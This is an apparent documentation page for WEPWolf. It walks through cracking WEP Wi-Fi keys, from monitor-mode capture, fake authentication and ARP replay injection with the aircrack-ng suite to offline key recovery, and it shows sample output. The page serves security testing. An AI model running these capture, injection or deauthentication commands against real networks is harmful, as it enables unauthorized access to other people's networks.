# Cracking WEP

WEP (Wired Equivalent Privacy) encrypts each 802.11 frame with RC4, keyed by a static secret concatenated with a 24-bit initialization vector sent in the clear. The 24-bit IV space is tiny: it exhausts within hours on a busy network, and the RC4 key schedule leaks key bytes through predictable biases. The result: given enough captured frames, the key falls out statistically, no wordlist needed. See the [WEP reference](../wep/index.md) for the full cryptographic breakdown.

## What you need

- **A capture file** containing WEP-encrypted traffic (`.pcap`, `.pcapng`, or `.gz`). You can capture one yourself with `airodump-ng` (Step 1 below) or work with captures you already have.
- **[WEPWolf](https://github.com/StrongWind1/WEPWolf)** is the primary cracking tool. Download a prebuilt binary from [GitHub Releases](https://github.com/StrongWind1/WEPWolf/releases/latest) or build from source (`git clone` + `make release`).
- **[aircrack-ng](https://github.com/aircrack-ng/aircrack-ng)** (optional): needed only for active radio attacks like packet injection and ARP replay. Install with `sudo apt install aircrack-ng`.

## Step 1: Capture WEP traffic

WEPWolf is passive and offline. It works on capture files you already have on disk, never touches a radio. If you need to generate a capture, use `airodump-ng`:

```bash
# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Find the target (look for ENC = WEP)
sudo airodump-ng wlan0mon

# Capture on target channel
sudo airodump-ng -c <channel> --bssid <BSSID> -w wep_capture wlan0mon
```

Watch the `#Data` column. That is your unique IV count. PTW typically needs **40,000+ unique IVs** for WEP-104 (fewer for WEP-40). If traffic is slow, generate IVs with ARP replay injection:

```bash
# Fake-authenticate with the AP first
sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <your_mac> wlan0mon

# ARP replay -- the primary IV generator
sudo aireplay-ng -3 -b <BSSID> -h <your_mac> wlan0mon
```

Once `#Data` passes ~40K, you have enough. The capture file (`wep_capture-01.cap`) is ready for WEPWolf.

## Step 2: Recover the key with WEPWolf

### Basic usage

Point WEPWolf at a capture and it runs every applicable attack automatically:

```bash
wepwolf wep_capture-01.cap
```

That is the entire command. WEPWolf detects the key length, runs PTW/KoreK/FMS/RC4-bias, confirms every candidate by decrypting real frames and checking the CRC-32 ICV, and prints the result. No flags needed for a typical crack.

### Directory scan with cross-file merging

If you have multiple capture files from the same site, point WEPWolf at the directory:

```bash
wepwolf captures/
```

WEPWolf ingests every file in parallel, merges IVs for each BSSID across all files, and cracks networks in parallel. A key found on one file is reused against co-located access points that share it.

### With a wordlist

For the dictionary and keygen attacks (Neesus-Datacom WEP-40, MD5 WEP-104):

```bash
wepwolf -w wordlist.txt wep_capture-01.cap
```

### Targeting a specific BSSID or key length

```bash
wepwolf -b 00:11:22:33:44:55 wep_capture-01.cap    # single BSSID
wepwolf -n 40 wep_capture-01.cap                     # WEP-40 only
```

### Output formats

| Flag | Format | Use case |
|------|--------|----------|
| (default) | Human-readable table | Interactive use |
| `--plain` | Tab-separated tagged records | Shell pipelines, `awk`/`cut` |
| `--json` | NDJSON (one typed object per line) | Programmatic consumption |
| `--potfile keys.pot` | hashcat-style `bssid:key_hex` | Persistent key store |
| `-q` | Keys only (no summary/stats) | Scripts that just need the key |

### Carving frames

Extract every WEP frame WEPWolf parsed into a single standalone pcap:

```bash
wepwolf --carve carved.pcap captures/
```

This normalizes mixed radiotap/Prism/AVS inputs to raw 802.11, collapses many capture files into one, and produces a file that both WEPWolf and aircrack-ng read cleanly.

### Example output

```text
$ wepwolf wep_64_ptw.cap
KEYS RECOVERED
BSSID              ESSID             BITS  ID  VIA              IVS    TIME  KEY
00:12:bf:12:32:29  Appart              40   0  ptw            30566   0.03s  1f:1f:1f:1f:1f

WEP BSSIDs (most IVs first):
BSSID                   IVS  VIA         ESSID
00:12:bf:12:32:29     30566  ptw         Appart
(1 WEP, 0 WPA, 0 open, 0 unknown BSSIDs observed; --json for all)
=== WEPWolf ====================================================
-- ingest ------------------------------------------------------
captures read ............................................: 1
packets total ............................................: 65282
...
```

### Search tuning

These flags mirror the aircrack-ng knobs if you need to adjust the attack:

| Flag | Effect |
|------|--------|
| `-f <FACTOR>` | Fudge factor: keep octets voting >= top/FACTOR (aircrack's `-f`) |
| `-x <N>` | Exhaustively sweep last N key octets (default 2, max 4) |
| `-c` | Restrict candidates to printable ASCII |
| `--brute` | Brute-force WEP-40 if no other attack recovers it (slow: 2^40) |

## Why WEPWolf over aircrack-ng

Both tools implement the same attack family (PTW, KoreK, FMS) with the same unique-IV voting and CRC-32 acceptance standard. WEPWolf adds capabilities aircrack-ng does not have:

| Capability | WEPWolf | aircrack-ng |
|------------|---------|-------------|
| RC4-bias database (Sepehrdad FSE 2013) | Ships it. Recovers WEP-104 from fewer packets | Not included |
| Per-key-slot cracking (Key ID 0-3) | Cracks each slot separately; finds keys a pooled vote misses | Pools all key IDs |
| Directory ingestion | Parallel scan + cross-file IV merging | Single file at a time |
| IPv6/EAPOL known-plaintext | Reads destination MAC to mine ND and EAPOL headers | IPv4-shaped guess only |
| Frame carving (`--carve`) | Extracts WEP frames into a re-crackable pcap | Not available |
| Output formats | Table, TSV, NDJSON, potfile | Table only |

WEPWolf is passive and offline only. It reads capture files and recovers keys. It does not capture traffic, inject frames, or touch a radio. That is by design: the active tools are the aircrack-ng suite's job.

## Alternative: aircrack-ng

Use aircrack-ng when you need active radio attacks that WEPWolf does not perform:

- **ARP replay injection** (`aireplay-ng -3`): generate IVs on a quiet network
- **ChopChop** (`aireplay-ng -4`): decrypt a frame byte-by-byte without the key
- **Fragmentation** (`aireplay-ng -5`): recover keystream from a single fragment
- **Caffe-Latte / Hirte** (`aireplay-ng -6` / `-8`): client-side attacks without AP proximity
- **Deauthentication** (`aireplay-ng -0`): force clients to reconnect and generate traffic

For passive key recovery from a capture file, aircrack-ng works but is single-file, CPU-only, and lacks the RC4-bias database and per-key-slot cracking.

```bash
aircrack-ng wep_capture-01.cap              # PTW (default)
aircrack-ng -K wep_capture-01.cap           # KoreK statistical attack
```

See the [aircrack-ng WEP workflow](../wep/aircrack-workflow.md) for the full step-by-step.

## Deep dive

- [WEP protocol reference](../wep/index.md): IV reuse, CRC-32 linearity, RC4 KSA weakness, attack history
- [Aircrack-ng WEP workflow](../wep/aircrack-workflow.md): full active attack walkthrough with injection
- [WEPWolf documentation](https://strongwind1.github.io/WEPWolf/): complete option reference, output formats, tuning guide
- [Aircrack-ng suite](../tools/aircrack-suite.md): tool reference for the full suite
